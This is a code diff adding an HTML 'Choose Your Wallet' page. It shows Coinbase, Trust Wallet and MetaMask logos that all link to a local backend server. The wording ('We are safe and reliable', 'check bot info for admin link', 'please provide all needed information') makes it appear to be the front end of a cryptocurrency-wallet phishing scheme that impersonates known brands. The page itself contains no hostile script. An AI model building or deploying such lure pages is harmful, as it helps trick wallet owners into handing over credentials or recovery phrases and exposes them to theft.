@@ -1,0 +1,132 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<style>
+		body {
+			background: linear-gradient(to bottom right, #8b5cde, #6930c3);
+			color: #fff;
+			font-family: Arial, sans-serif;
+			text-align: center;
+		}
+
+		h1 {
+			margin-top: 50px;
+			font-size: 30px;
+			text-transform: uppercase;
+			letter-spacing: 2px;
+			animation: fadeIn 2s ease-in-out;
+		}
+
+		p {
+			font-size: 18px;
+			margin-bottom: 20px;
+			animation: fadeIn 2s ease-in-out;
+		}
+
+		@keyframes fadeIn {
+			from { opacity: 0; }
+			to { opacity: 1; }
+		}
+
+		.wallet-logo {
+			display: inline-block;
+			margin: 10px;
+		}
+
+		.wallet-logo img {
+			width: 100px;
+			height: 100px;
+			border-radius: 50%;
+		}
+
+		.wallet-logo a {
+			color: #fff;
+			text-decoration: none;
+		}
+
+		.error-message {
+			font-size: 16px;
+			margin-top: 50px;
+			animation: fadeIn 2s ease-in-out;
+		}
+        @media screen and (max-width: 767px) {
+  /* Styles for small devices */
+  .container {
+    flex-direction: column;
+  }
+
+  .wallet-logo {
+    width: 50%;
+  }
+}
+
+@media screen and (min-width: 768px) and (max-width: 1023px) {
+  /* Styles for medium devices */
+  .wallet-logo {
+    width: 33.33%;
+  }
+}
+
+@media screen and (min-width: 1024px) {
+  /* Styles for large devices */
+  .container {
+    justify-content: space-between;
+  }
+
+  .wallet-logo {
+    width: 25%;
+  }
+}
+ /* Style for the footer */
+ .footer {
+      background-color: #6bd7ed;
+      padding: 20px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      transition: height 0.5s ease-out; /* Transition animation */
+    }
+
+    /* Style for the link in the footer */
+    .footer a {
+      color: #000;
+      text-decoration: none;
+      transition: color 0.5s;
+    }
+
+    /* Style for the link hover effect */
+    .footer a:hover {
+      color: blue;
+    }
+
+	</style>
+</head>
+<body>
+	<h1>Choose Your Wallet</h1>
+	<p>Please contact an admin if you encounter any errors. We are safe and reliable.</p>
+
+	<div class="wallet-logos">
+		<div class="wallet-logo">
+			<a href="http://127.0.0.1:5000/"><img src="coinbase.png" alt="Wallet 1"></a>
+		</div>
+		<div class="wallet-logo">
+			<a href="http://127.0.0.1:5000/ "><img src="trustwallet.png" alt="Wallet 2"></a>
+		</div>
+        <div class="wallet-logo">
+			<a href="http://127.0.0.1:5000/"><img src="metamask.png" alt="Wallet 3"></a>
+		</div>
+		<!-- Add more wallet logos with links here -->
+	</div>
+
+	<p class="error-message">If you have any questions, please contact our admin team.or check bot info for admin link</p>
+  
+  <!-- Footer section -->
+  <div class="footer">
+    <p>please provide all needed information.</p>
+    <p>© 2023 Your Website. All rights reserved.</p>
+    <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
+  </div>
+
+</body>
+</html>
